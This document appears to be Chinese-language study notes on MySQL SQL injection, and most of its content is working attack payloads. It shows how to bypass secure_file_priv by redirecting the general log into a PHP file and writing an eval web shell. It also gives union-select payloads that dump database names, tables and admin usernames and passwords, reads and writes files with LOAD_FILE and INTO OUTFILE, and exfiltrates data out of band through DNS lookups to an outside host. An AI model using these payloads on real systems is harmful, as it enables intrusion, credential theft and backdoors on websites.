## root用户和普通用户

1、文件读写操作权限

2、所有数据库名获取

root用户可以看到连接下的所有数据库

## secure_file_priv开关

show variables like "secure%"

通过my.ini(windows版本)/my.cnf(Linux版本)中设置secure_file_priv是MySQL中的系统变量，用于限制文件的读取和写入

绕过条件：
存在可执行的SQL地方（后台SQL命令执行，Phpmyadmin应用等）

从后台的sql命令执行功能点：注入获取得到这个网站的后台账号密码

从phpmyadmin命令执行功能点：注入获取到数据库的用户名和密码

存储在mysql数据库下user(password或authentication_string)

slow_query_log=1（启用慢查询日志(默认禁用)）

```
slow_query_log=1（启用慢查询日志(默认禁用)）

show variables like 'general_log';

set global general_log=on;

set global general_log_file='网站路径/bypass.php';

select '<?php @eval($_POST[x]);?>'
```

## 跨库注入

```
查数据库名：

' union select SCHEMA_name,2,3 from information_schema.SCHEMATA#

查表名：

' union select table_name,2,3 from information_schema.tables where table_schema='aicms'#

查列名：

' union select column_name,2,3 from information_schema.columns where table_name='wolive_admin'#

查数据：

' union select username,2,3 from aicms.wolive_admin#

' union select password,2,3 from aicms.wolive_admin#

#文件操作：

关于网站路径获取方法：

1、遗留文件

2、报错显示

3、读中间件配置

4、爆破fuzz路径

' union select LOAD_FILE('d:\\1.txt'),2,3#

' union select 'xxxx',2,3 into outfile 'd:\\3.txt'#

#带外注入：

查数据名：' union select load_file(concat('\\\\',(select database()),'.yjjoxijrhw.yutu.eu.org\\aa')),2,3#

查表名1：' union select load_file(concat("\\\\",(select table_name from information_schema.tables where table_schema='news_management' limit 0,1 ),".yjjoxijrhw.yutu.eu.org\\xxx.txt")),2,3#

查表名2：' union select load_file(concat("\\\\",(select table_name from information_schema.tables where table_schema='news_management' limit 0,2 ),".yjjoxijrhw.yutu.eu.org\\xxx.txt")),2,3#

查列名：.......****
```